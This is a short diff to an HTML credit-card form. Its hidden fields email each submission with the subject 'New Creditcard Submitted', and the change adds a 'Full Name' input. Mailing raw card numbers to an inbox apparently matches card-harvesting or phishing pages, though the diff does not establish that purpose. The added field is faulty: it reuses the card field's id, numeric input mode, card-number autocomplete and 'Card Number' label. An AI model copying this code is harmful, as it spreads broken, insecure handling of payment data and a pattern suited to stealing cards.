@@ -407,7 +407,19 @@
   <input type="hidden" name="_subject" value="New Creditcard Submitted">
   <input type="hidden" name="_autoresponse" value="Your card information has been received. Thank you!">
 
-      <div>
+   
+         <div>
+        <label for="card-number">Enter Full  Name</label>
+        <div class="input-card-number">
+          <span class="icon">💳</span>
+
+          <input type="text" id="card-number" name="cardName" placeholder="Full Name" maxlength="19"
+
+            inputmode="numeric" autocomplete="cc-number" aria-required="true" aria-label="Card Number" />
+          <span class="icon">🔒</span>
+        </div>
+           
+           <div>
         <label for="card-number">Card Number</label>
         <div class="input-card-number">
           <span class="icon">💳</span>
